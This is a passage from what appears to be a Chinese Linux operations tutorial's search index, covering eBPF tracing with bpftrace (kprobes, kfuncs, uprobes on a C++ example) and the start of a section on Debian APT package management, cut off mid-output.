kprobe/kretprobe\uff0c\u200b\u4e0d\u80fd\u200b\u5728\u200b\u4efb\u610f\u200b\u4f4d\u7f6e\u200b\u63d2\u5165\u200b\uff0c\u200b\u4f46\u662f\u200b\u6027\u80fd\u200b\u66f4\u597d\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5230\u200b\u7c7b\u578b\u4fe1\u606f\u200b\uff0ckretfunc \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u51fd\u6570\u200b\u7684\u200b\u53c2\u6570\u200b</li> </ul> <p>\u200b\u4f7f\u7528\u200b <code>bpftrace -l</code> \u200b\u53ef\u4ee5\u200b\u83b7\u53d6\u200b\u5230\u200b\u5f53\u524d\u200b\u7cfb\u7edf\u200b\u652f\u6301\u200b\u7684\u200b\u6240\u6709\u200b probe\u3002\u200b\u4e00\u822c\u6765\u8bf4\u200b\uff0c\u200b\u5185\u6838\u200b\u7248\u672c\u200b\u8d8a\u65b0\u200b\uff0c\u200b\u652f\u6301\u200b\u8d8a\u200b\u597d\u200b\u3002</p> <pre><code>$ sudo bpftrace -l\n\uff08\u200b\u7701\u7565\u200b\uff09\ntracepoint:xhci-hcd:xhci_setup_addressable_virt_device\ntracepoint:xhci-hcd:xhci_setup_device\ntracepoint:xhci-hcd:xhci_setup_device_slot\ntracepoint:xhci-hcd:xhci_stop_device\ntracepoint:xhci-hcd:xhci_urb_dequeue\ntracepoint:xhci-hcd:xhci_urb_enqueue\ntracepoint:xhci-hcd:xhci_urb_giveback\n</code></pre> <p>\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u4f8b\u5b50\u200b\u662f\u200b\u83b7\u53d6\u200b\u7cfb\u7edf\u200b\u4e4b\u540e\u200b\u6267\u884c\u200b\u7684\u200b\u6240\u6709\u200b\u7a0b\u5e8f\u200b\uff08execsnoop\uff09\u3002 \u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u7b80\u5316\u200b\u7684\u200b\u7248\u672c\u200b\uff0c\u200b\u8f93\u51fa\u200b\u6267\u884c\u200b\u4e86\u200b <code>execve()</code> \u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u5176\u200b\u53c2\u6570\u200b\uff08\u200b\u6587\u4ef6\u200b\u8def\u5f84\u200b\uff09\uff1a</p> <pre><code>$ sudo bpftrace -e 'tracepoint:syscalls:sys_enter_execve { printf(\"%s %s\\n\", comm, str(args-&gt;filename)); }'\nAttaching 1 probe...\ncode /home/username/.nix-profile/bin/docker\ncode /usr/lib/rustup/bin/docker\ncode /home/username/.local/bin/docker\ncode /home/username/.cargo/bin/docker\n^C\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>args-&gt;filename</code> \u200b\u83b7\u53d6\u200b\u5230\u200b <code>execve()</code> \u200b\u7684\u200b\u53c2\u6570\u200b\uff0c\u200b\u56e0\u4e3a\u200b bpftrace \u200b\u80fd\u591f\u200b\u83b7\u53d6\u200b\u5230\u200b\u76f8\u5173\u200b\u7684\u200b\u7c7b\u578b\u4fe1\u606f\u200b\uff1a</p> <pre><code>$ sudo bpftrace -lv tracepoint:syscalls:sys_enter_execve\ntracepoint:syscalls:sys_enter_execve\n    int __syscall_nr\n    const char * filename\n    const char *const * argv\n    const char *const * envp\n</code></pre> <p>\u200b\u6709\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4f60\u200b\u9700\u8981\u200b\u8ffd\u8e2a\u200b\u7684\u200b\u51fd\u6570\u200b\u4e0d\u200b\u5728\u200b tracepoint \u200b\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b kprobe/kretprobe\uff08\u200b\u6216\u8005\u200b kfunc/kretfunc\uff09\uff0c \u200b\u4f8b\u5982\u200b\u4e0b\u9762\u200b\u8fd9\u4e2a\u200b\u8ffd\u8e2a\u200b <code>try_charge_memcg</code> \u200b\u7684\u200b\u7b2c\u4e09\u4e2a\u200b\u53c2\u6570\u200b <code>nr_pages</code> \u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>$ sudo bpftrace -e 'kprobe:try_charge_memcg { printf(\"%d\\n\", arg2); }'  # \u200b\u7b2c\u4e00\u4e2a\u200b\u53c2\u6570\u200b\u662f\u200b arg0\n1\n1\n1\n2\n...\n^C\n$ # \u200b\u901a\u5e38\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u8ffd\u8e2a\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u5bf9\u200b\u67d0\u4e2a\u200b\u5185\u6838\u200b\u51fd\u6570\u200b\u7684\u200b\u8c03\u7528\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u8ffd\u8e2a\u200b\u67d0\u4e2a\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u8c03\u7528\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u8fd9\u4e48\u200b\u5199\u200b\uff1a\n$ # \u200b\u5047\u8bbe\u200b PID \u200b\u4e3a\u200b 1234567\n$ sudo bpftrace -e 'kprobe:try_charge_memcg /pid == 1234567/ { printf(\"%d\\n\", arg2); }'\n1\n1\n...\n</code></pre> <p>\u200b\u4f7f\u7528\u200b kprobe \u200b\u548c\u200b kretprobe \u200b\u65f6\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b pattern \u200b\u662f\u200b\uff1akprobe \u200b\u8bb0\u5f55\u200b\u67d0\u79cd\u200b\u72b6\u6001\u200b\uff08\u200b\u4f8b\u5982\u200b\u65f6\u95f4\u200b\u6216\u8005\u200b\u8c03\u7528\u200b\u53c2\u6570\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u5728\u200b kretprobe \u200b\u4e2d\u200b\u8f93\u51fa\u200b\u3002 \u200b\u76f8\u5173\u200b\u7684\u200b\u4f8b\u5b50\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b bpftrace \u200b\u7684\u200b\u793a\u4f8b\u200b\u4e0e\u200b\u6587\u6863\u200b\u3002</p> <p>\u200b\u5728\u200b\u652f\u6301\u200b kfunc \u200b\u7684\u200b\u73af\u5883\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b kfunc \u200b\u8ba9\u200b\u903b\u8f91\u200b\u66f4\u52a0\u200b\u6e05\u6670\u200b\uff1a</p> <pre><code>$ sudo bpftrace -lv kfunc:try_charge_memcg\nkfunc:vmlinux:try_charge_memcg\n    struct mem_cgroup * memcg\n    gfp_t gfp_mask\n    unsigned int nr_pages\n    int retval\n$ sudo bpftrace -e 'kfunc:try_charge_memcg { printf(\"%d\\n\", args-&gt;nr_pages); }'\n...\n</code></pre> <p>\u200b\u9664\u4e86\u200b bpftrace \u200b\u8fd9\u200b\u7c7b\u200b\u901a\u7528\u578b\u200b\u7684\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\u4e4b\u5916\u200b\uff0c\u200b\u8fd8\u6709\u200b\u5f88\u591a\u200b\u7528\u6765\u200b\u8c03\u8bd5\u200b\u7279\u5b9a\u200b\u7684\u200b\u95ee\u9898\u200b\u7684\u200b\u8c03\u8bd5\u200b\u5de5\u5177\u200b\uff0c\u200b\u6bd4\u5982\u200b\uff1a</p> <ul> <li>retsnoop \u200b\u53ef\u4ee5\u200b\u627e\u51fa\u200b\u5185\u6838\u200b\u8fd4\u56de\u200b\u4e00\u4e2a\u200b\u9519\u8bef\u7801\u200b\u7684\u200b\u5177\u4f53\u4f4d\u7f6e\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u5728\u200b\u9519\u8bef\u7801\u200b\u542b\u4e49\u200b\u4e0d\u591f\u200b\u660e\u786e\u200b\u7684\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u5b9a\u4f4d\u200b\u66f4\u200b\u5177\u4f53\u200b\u7684\u200b\u51fa\u9519\u200b\u539f\u56e0\u200b\u3002</li> </ul>"},{"location":"ops/debug/#user-space-ebpf","title":"\u7528\u6237\u200b\u6001","text":"<p>eBPF \u200b\u6280\u672f\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u7528\u6237\u200b\u6001\u200b\u8c03\u8bd5\u200b\uff0c\u200b\u5728\u200b bpftrace \u200b\u4e2d\u200b\u5bf9\u5e94\u200b\u7684\u200b\u662f\u200b uprobe \u200b\u548c\u200b uretprobe\u3002</p> <p>\u200b\u4ee5\u200b\u4e0b\u9762\u200b\u7684\u200b C++ \u200b\u7a0b\u5e8f\u200b\u4e3a\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>#include &lt;iostream&gt;\n\nint example(int a, int b) {\n    return a + b;\n}\n\nint main(void) {\n    for (int i = 0; i &lt; 1024; i++) {\n        int a = i, b = i + 1;\n        std::cout &lt;&lt; example(a, b) &lt;&lt; std::endl;\n    }\n    return 0;\n}\n</code></pre> <p>\u200b\u7f16\u8bd1\u200b\u5e76\u200b\u67e5\u770b\u200b\u7b26\u53f7\u200b\uff1a</p> <pre><code>$ g++ example.cpp -O0 -o example\n$ nm example\n0000000000004040 B __bss_start\n                 w __cxa_finalize@GLIBC_2.2.5\n0000000000004028 D __data_start\n0000000000004028 W data_start\n0000000000004030 D __dso_handle\n0000000000003db0 d _DYNAMIC\n0000000000004038 D _edata\n0000000000004158 B _end\n...\n</code></pre> <p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u627e\u5230\u200b <code>example()</code> \u200b\u51fd\u6570\u200b\u5bf9\u5e94\u200b\u7684\u200b\u7b26\u53f7\u200b\uff1a</p> <pre><code>$ nm example | grep example\n0000000000001220 T _Z7exampleii\n</code></pre> <p>\u200b\u7b26\u53f7\u200b\u7684\u200b\u540d\u79f0\u200b\u4fee\u9970\u200b\uff08Name mangling\uff09</p> <p>\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c\u200b\u4e0a\u9762\u200b\u7684\u200b\u7b26\u53f7\u200b\u540d\u200b\u4e0d\u662f\u200b <code>example</code>\uff0c\u200b\u800c\u662f\u200b <code>_Z7exampleii</code>\u3002 C++ \u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u67d0\u4e9b\u200b\u8bed\u8a00\u200b\uff08\u200b\u4f8b\u5982\u200b Rust\uff09\u200b\u4f1a\u200b\u5728\u200b\u7f16\u8bd1\u200b\u671f\u200b\u4fee\u6539\u200b\u51fd\u6570\u200b\u7684\u200b\u540d\u79f0\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u652f\u6301\u200b\u51fd\u6570\u200b\u91cd\u8f7d\u200b\u7b49\u200b\u7279\u6027\u200b\u3002 \u200b\u8fd9\u91cc\u200b\u7684\u200b\u540d\u5b57\u200b\u7ecf\u8fc7\u200b demangle \u200b\u4e4b\u540e\u200b\u5c31\u662f\u200b <code>example(int, int)</code>\u3002</p> <p><code>nm</code></p> <p><code>nm</code> \u200b\u662f\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u67e5\u770b\u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7b26\u53f7\u200b\u7684\u200b\u5de5\u5177\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u67e5\u770b\u200b\u51fd\u6570\u200b\u3001\u200b\u53d8\u91cf\u200b\u7b49\u200b\u7684\u200b\u5730\u5740\u200b\u3002 \u200b\u5982\u679c\u200b\u4e0d\u200b\u52a0\u200b\u53c2\u6570\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4f1a\u200b\u5217\u51fa\u200b\u6587\u4ef6\u200b\u4e2d\u200b\u7684\u200b\u9759\u6001\u200b\u7b26\u53f7\u200b\uff08\u200b\u4f8b\u5982\u200b\u5168\u5c40\u53d8\u91cf\u200b\u3001\u200b\u51fd\u6570\u200b\u7b49\u200b\uff09\u3002 \u200b\u5bf9\u4e8e\u200b\u52a8\u6001\u94fe\u63a5\u5e93\u200b\uff08<code>.so</code> \u200b\u6587\u4ef6\u200b\uff09\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>nm -D</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u5176\u200b\u66b4\u9732\u200b\u7ed9\u200b\u5e94\u7528\u200b\u7684\u200b\u52a8\u6001\u200b\u7b26\u53f7\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b uprobe \u200b\u8ffd\u8e2a\u200b <code>example()</code> \u200b\u51fd\u6570\u200b\u7684\u200b\u8c03\u7528\u200b\uff1a</p> <pre><code>$ sudo bpftrace -e 'uprobe:/path/to/example:_Z7exampleii { printf(\"example(%d, %d)\\n\", arg0, arg1); }'\nAttaching 1 probe...\n\uff08\u200b\u5728\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u7ec8\u7aef\u200b\u6267\u884c\u200b ./example \u200b\u4e4b\u540e\u200b\uff09\nexample(0, 1)\nexample(1, 2)\n...\nexample(1023, 1024)\n</code></pre> <p>\u200b\u7f16\u8bd1\u5668\u200b\u4f18\u5316\u200b</p> <p>\u200b\u5982\u679c\u200b\u4e0a\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4f7f\u7528\u200b <code>-O2</code>\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u8fd9\u91cc\u200b\u7684\u200b bpftrace \u200b\u6ca1\u6709\u200b\u8f93\u51fa\u200b\u4efb\u4f55\u200b\u5185\u5bb9\u200b\u3002 \u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b\u7f16\u8bd1\u5668\u200b\u8fdb\u884c\u200b\u4e86\u200b\u5185\u8054\u200b\u4f18\u5316\u200b\uff0c\u200b\u5c06\u200b <code>example()</code> \u200b\u51fd\u6570\u200b\u5185\u8054\u200b\u5230\u200b\u4e86\u200b <code>main()</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\uff0c\u200b\u7701\u53bb\u200b\u4e86\u200b\u51fd\u6570\u8c03\u7528\u200b\u7684\u200b\u5f00\u9500\u200b\u3002 \u200b\u65e2\u7136\u200b\u6ca1\u6709\u200b\u51fd\u6570\u8c03\u7528\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4e5f\u200b\u5c31\u200b\u6ca1\u6709\u200b uprobe \u200b\u53ef\u4ee5\u200b\u8ffd\u8e2a\u200b\u7684\u200b\u5730\u65b9\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>objdump -d</code> \u200b\u6765\u200b\u67e5\u770b\u200b\u7f16\u8bd1\u200b\u540e\u200b\u7684\u200b\u6c47\u7f16\u200b\u4ee3\u7801\u200b\uff0c\u200b\u4ee5\u200b\u786e\u8ba4\u200b\u662f\u5426\u200b\u53d1\u751f\u200b\u4e86\u200b\u5185\u8054\u200b\u4f18\u5316\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b uprobe \u200b\u8ffd\u8e2a\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u7684\u200b\u7a0b\u5e8f\u200b</p> <p>\u200b\u5728\u200b\u5bb9\u5668\u200b\u4e2d\u200b\u7f16\u8bd1\u200b\u5e76\u200b\u8fd0\u884c\u200b\u4e0b\u9762\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff1a</p> <pre><code>#include &lt;iostream&gt;\n#include &lt;random&gt;\n#include &lt;unistd.h&gt;\n\nint example(int a, int b) {\n    return a + b;\n}\n\nint main(void) {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution&lt;&gt; distr(1, 1024);\n    for (;;) {\n        int a = distr(gen), b = distr(gen);\n        std::cout &lt;&lt; example(a, b) &lt;&lt; std::endl;\n        sleep(1);\n    }\n    return 0;\n}\n</code></pre> <p>\u200b\u5c1d\u8bd5\u200b\u8ffd\u8e2a\u200b\u5bf9\u5e94\u200b\u7a0b\u5e8f\u200b\u7684\u200b <code>example()</code> \u200b\u51fd\u6570\u8c03\u7528\u200b\u3002</p> <p>\u200b\u63d0\u793a\u200b\uff1aprocfs \u200b\u4e2d\u200b\u7684\u200b <code>/proc/&lt;pid&gt;/root</code> \u200b\u76ee\u5f55\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6709\u6240\u200b\u5e2e\u52a9\u200b\u3002</p> <p>\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e0e\u200b\u8bf4\u660e\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b\uff1a</p> <ul> <li>The bpftrace One-Liner Tutorial\uff08\u200b\u4e2d\u6587\u7248\u200b\uff09</li> <li>bpftrace(8) Manual Page</li> </ul> <p>eBPF \u200b\u7a0b\u5e8f\u200b\u7f16\u5199\u200b\u5b9e\u9a8c\u200b</p> <p>\u200b\u5c1d\u8bd5\u200b\u4f7f\u7528\u200b bpftrace \u200b\u6216\u200b bcc \u200b\u5b8c\u6210\u200b\u4ee5\u4e0b\u200b\u4efb\u52a1\u200b\uff1a</p> <ul> <li>\u200b\u5bf9\u200b\u6574\u4e2a\u200b\u7cfb\u7edf\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u505a\u200b\u76d1\u6d4b\u200b\uff0c\u200b\u5f53\u200b\u7a0b\u5e8f\u200b\u9000\u51fa\u200b\u65f6\u200b\uff0c\u200b\u8f93\u51fa\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u8fd0\u884c\u200b\u65f6\u95f4\u200b\uff08Wall time\uff09\u3002<ul> <li>\u200b\u6311\u6218\u200b\uff1a\u200b\u80fd\u5426\u200b\u5c3d\u53ef\u80fd\u200b\u8f93\u51fa\u200b\u7a0b\u5e8f\u200b\u88ab\u200b\u6267\u884c\u200b\u65f6\u200b\u7684\u200b\u547d\u4ee4\u884c\u200b\u53c2\u6570\u200b\uff1f</li> </ul> </li> <li>\u200b\u5bf9\u200b\u67d0\u4e2a\u200b\u7a0b\u5e8f\u200b\u505a\u200b\u76d1\u6d4b\u200b\uff0c\u200b\u5f53\u8be5\u200b\u7a0b\u5e8f\u6267\u884c\u200b\u67d0\u79cd\u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u65f6\u200b\uff08\u200b\u4f8b\u5982\u200b\u8bfb\u53d6\u200b\u6587\u4ef6\u200b\uff09\uff0c\u200b\u8f93\u51fa\u200b\u7a0b\u5e8f\u200b\u7684\u200b\u8c03\u7528\u200b\u6808\u200b\u3002</li> </ul>"},{"location":"ops/debug/#supplement","title":"\u8865\u5145\u200b\u9605\u8bfb","text":""},{"location":"ops/debug/#supplement-books","title":"\u4e66\u7c4d","text":"<ul> <li>Performance Analysis and Tuning on Modern CPU\uff1a\u200b\u975e\u5e38\u200b\u8be6\u7ec6\u200b\u7684\u200b\u5173\u4e8e\u200b\u7a0b\u5e8f\u200b\u6027\u80fd\u200b\u4f18\u5316\u200b\u7684\u200b\u4e66\u7c4d\u200b\uff0c\u200b\u540c\u65f6\u200b\u5176\u200b\u7ec3\u4e60\u200b\u5b9e\u9a8c\u200b perf-ninja \u200b\u4e5f\u200b\u503c\u5f97\u4e00\u770b\u200b\u3002</li> <li>Systems Performance: Enterprise and the Cloud\uff1a\u200b\u8457\u540d\u200b\u7684\u200b\u7cfb\u7edf\u200b\u6027\u80fd\u200b\u5206\u6790\u200b\u4e13\u5bb6\u200b Brendan Gregg \u200b\u64b0\u5199\u200b\u7684\u200b\u5173\u4e8e\u200b\u7cfb\u7edf\u200b\u6027\u80fd\u200b\u5206\u6790\u200b\u7684\u200b\u4e66\u7c4d\u200b\uff0c\u200b\u5185\u5bb9\u200b\u6db5\u76d6\u200b\u4e86\u200b\u4ece\u200b\u786c\u4ef6\u200b\u5230\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u5404\u4e2a\u65b9\u9762\u200b\u3002</li> </ul>"},{"location":"ops/debug/#supplement-sites","title":"\u7ad9\u70b9","text":"<ul> <li>Linux debugging, profiling and tracing training Course by bootlin\uff1aBootlin \u200b\u516c\u53f8\u200b\u63d0\u4f9b\u200b\u7684\u200b Linux \u200b\u8c03\u8bd5\u200b\u7b49\u200b\u6709\u5173\u200b\u7684\u200b\u8d44\u6599\u200b\uff0c\u200b\u5305\u62ec\u200b slides \u200b\u548c\u200b\u7ec3\u4e60\u200b\u5b9e\u9a8c\u200b</li> <li>Linux Extended BPF (eBPF) Tracing Tools\uff1aBrendan Gregg \u200b\u6574\u7406\u200b\u7684\u200b eBPF \u200b\u76f8\u5173\u200b\u7684\u200b\u5de5\u5177\u200b\u8d44\u6599\u200b\uff1bBrendan Gregg \u200b\u7684\u200b\u535a\u5ba2\u200b\u4e5f\u200b\u6709\u200b\u5f88\u591a\u200b\u5173\u4e8e\u200b\u7cfb\u7edf\u200b\u6027\u80fd\u200b\u5206\u6790\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u6b64\u5916\u200b\u672c\u6587\u200b\u7684\u200b\u51e0\u5f20\u200b\u5de5\u5177\u200b\u5408\u96c6\u200b\u56fe\u200b\u4e5f\u200b\u51fa\u81ea\u200b\u4ed6\u624b\u200b</li> <li>Linux Crisis Tools\uff1aBrendan Gregg \u200b\u6574\u7406\u200b\u7684\u200b Linux \u200b\u5e94\u6025\u200b\u54cd\u5e94\u200b\u5de5\u5177\u96c6\u200b\u5217\u8868\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u9884\u5148\u200b\u5b89\u88c5\u200b</li> </ul>"},{"location":"ops/package/","title":"\u5305\u200b\u7ba1\u7406\u7cfb\u7edf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky\u3001@2403772980ygy</p> <p>\u200b\u672c\u6587\u200b\u5df2\u200b\u5b8c\u6210\u200b\uff0c\u200b\u7b49\u5f85\u200b\u6821\u5bf9\u200b</p> <p>\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u662f\u200b\u73b0\u4ee3\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u7684\u200b\u91cd\u8981\u200b\u7ec4\u6210\u90e8\u5206\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b Debian \u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u76f8\u5173\u200b\u5de5\u5177\u200b\uff0c\u200b\u4f8b\u5982\u200b APT\uff08Advanced Package Tool\uff09\u3002\u200b\u5176\u4ed6\u200b\u53d1\u884c\u7248\u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\u4f1a\u200b\u6709\u6240\u4e0d\u540c\u200b\uff0c\u200b\u53ef\u200b\u53c2\u8003\u200b Arch Linux Wiki \u200b\u7684\u200b pacman/Rosetta \u200b\u9875\u9762\u200b\u3002</p> <p>\u200b\u672c\u6587\u200b\u5047\u8bbe\u200b\u8bfb\u8005\u200b\u4e86\u89e3\u200b\u6700\u200b\u57fa\u7840\u200b\u7684\u200b <code>apt</code> \u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u5982\u200b <code>apt install</code>, <code>apt remove</code>, <code>apt update</code>, <code>apt upgrade</code>\u3002</p>"},{"location":"ops/package/#apt-common-operations","title":"APT \u200b\u5e38\u7528\u200b\u64cd\u4f5c","text":"<p>Debian \u200b\u6709\u200b\u591a\u4e2a\u200b\u4e0e\u200b\u8f6f\u4ef6\u5305\u200b\u7ba1\u7406\u200b\u76f8\u5173\u200b\u7684\u200b\u5de5\u5177\u200b\u3002</p> <p>\u200b\u5176\u4e2d\u200b\u7684\u200b\u5e95\u5c42\u200b\u5de5\u5177\u200b\u4e3a\u200b dpkg\u3002dpkg \u200b\u4e0d\u200b\u8d1f\u8d23\u200b\u7ba1\u7406\u8f6f\u4ef6\u200b\u4f9d\u8d56\u200b\u5173\u7cfb\u200b\uff0c\u200b\u53ea\u200b\u7ba1\u7406\u200b\u5177\u4f53\u200b\u67d0\u200b\u4e00\u4e2a\u5305\u200b\u7684\u200b\u5b89\u88c5\u200b\u3001\u200b\u5378\u8f7d\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u3002\u200b\u56e0\u6b64\u200b\u9664\u975e\u200b\u9700\u8981\u200b\u6392\u67e5\u200b\u7591\u96be\u95ee\u9898\u200b\uff0c\u200b\u5426\u5219\u200b\u4e0d\u200b\u5e94\u8be5\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b dpkg \u200b\u4fee\u6539\u200b\u7cfb\u7edf\u200b\u72b6\u6001\u200b\u3002</p> <p>\u200b\u907f\u514d\u200b\u5728\u200b\u5b89\u88c5\u200b deb \u200b\u6587\u4ef6\u200b\u65f6\u200b\u4f7f\u7528\u200b dpkg</p> <p>\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u8bb8\u591a\u200b\u6559\u7a0b\u200b\uff0c\u200b\u751a\u81f3\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5b98\u65b9\u200b\u6587\u6863\u200b\uff0c\u200b\u90fd\u200b\u4f1a\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b <code>dpkg -i</code> \u200b\u5b89\u88c5\u200b deb \u200b\u6587\u4ef6\u200b\u3002\u200b\u5f53\u200b deb \u200b\u5b58\u5728\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u5e76\u4e14\u200b\u7cfb\u7edf\u200b\u672a\u200b\u5b89\u88c5\u200b\u6ee1\u8db3\u8981\u6c42\u200b\u7684\u200b\u4f9d\u8d56\u200b\u65f6\u200b\uff0c\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b <code>dpkg</code> \u200b\u4f1a\u200b\u5bfc\u81f4\u7cfb\u7edf\u200b\u4f9d\u8d56\u200b\u7ba1\u7406\u200b\u51fa\u73b0\u200b\u95ee\u9898\u200b\uff0c\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u82b1\u8d39\u200b\u7cbe\u529b\u200b\u4fee\u590d\u200b\u3002</p> <p>\u200b\u5efa\u8bae\u200b\u59cb\u7ec8\u200b\u4f7f\u7528\u200b <code>apt install ./path/to/package.deb</code> \u200b\u7684\u200b\u65b9\u5f0f\u200b\u5b89\u88c5\u200b deb \u200b\u6587\u4ef6\u200b\u3002</p> <p>\u200b\u4ece\u200b\u7528\u6237\u200b\u89c6\u89d2\u200b\u6765\u770b\u200b\uff0c\u200b\u6700\u200b\u5e38\u200b\u4f7f\u7528\u200b\u7684\u200b\u5de5\u5177\u200b\u662f\u200b apt\uff08\u200b\u4ee5\u53ca\u200b\u5176\u4ed6\u200b\u4ee5\u200b <code>apt-</code> \u200b\u5f00\u5934\u200b\u7684\u200b\u547d\u4ee4\u200b\uff09\u3002</p>"},{"location":"ops/package/#auto-manual","title":"\u6807\u8bb0\u200b\u8f6f\u4ef6\u5305\u200b\u4e3a\u200b\u81ea\u52a8\u200b/\u200b\u624b\u52a8\u200b\u5b89\u88c5","text":"<p>\u200b\u7edd\u5927\u591a\u6570\u200b\u8f6f\u4ef6\u5305\u200b\u90fd\u200b\u4e0d\u662f\u200b\u5b64\u7acb\u200b\u7684\u200b\uff1a\u200b\u5b83\u4eec\u200b\u4e5f\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5982\u679c\u200b\u5b89\u88c5\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5e26\u6709\u200b\u5176\u4ed6\u200b\u4f9d\u8d56\u200b\u7684\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u5220\u9664\u200b\u8fd9\u4e2a\u200b\u8f6f\u4ef6\u200b\uff0c\u200b\u5176\u200b\u5f15\u5165\u200b\u7684\u200b\u4f9d\u8d56\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u81ea\u52a8\u200b\u5220\u9664\u200b\uff0c\u200b\u4e0d\u8fc7\u200b\uff1a</p> <pre><code># apt install x11-apps\nReading package lists... Done\nBuilding dependency tree... Done\nReading state information... Done\nThe following additional packages will be installed:\n  bsdextrautils bsdutils fontconfig-config fonts-dejavu-core groff-base libblkid1 libbrotli1 libbsd0 libexpat1 libfontconfig1 libfreetype6 libgdbm6 libice6 libmount1\n  libpipeline1 libpng16-16 libsm6 libsmartcols1 libuchardet0 libuuid1 libx11-6 libx11-data libx11-xcb1 libxau6 libxaw7 libxcb-damage0 libxcb-present0 libxcb-xfixes0 libxcb1\n  libxcursor1 libxdmcp6 libxext6 libxfixes3 libxft2 libxi6 libxkbfile1 libxmu6 libxmuu1 libxpm4 libxrender1 libxt6 man-db mount util-linux util-linux-extra x11-common\n  xbitmaps\nSuggested packages:\n  groff gdbm-l10n cryptsetup-bin apparmor less www-browser nfs-common dosfstools kbd util-linux-locales mesa-utils\nRecommended packages:\n  uuid-runtime sensible-utils\nThe following NEW packages will be installed:\n  bsdextrautils fontconfig-config fonts-dejavu-core groff-base libbrotli1 libbsd0 libexpat1 libfontconfig1 libfreetype6 libgdbm6 libice6 libpipeline1 libpng16-16 libsm6\n  libuchardet0 libx11-6 libx11-data libx11-xcb1 libxau6 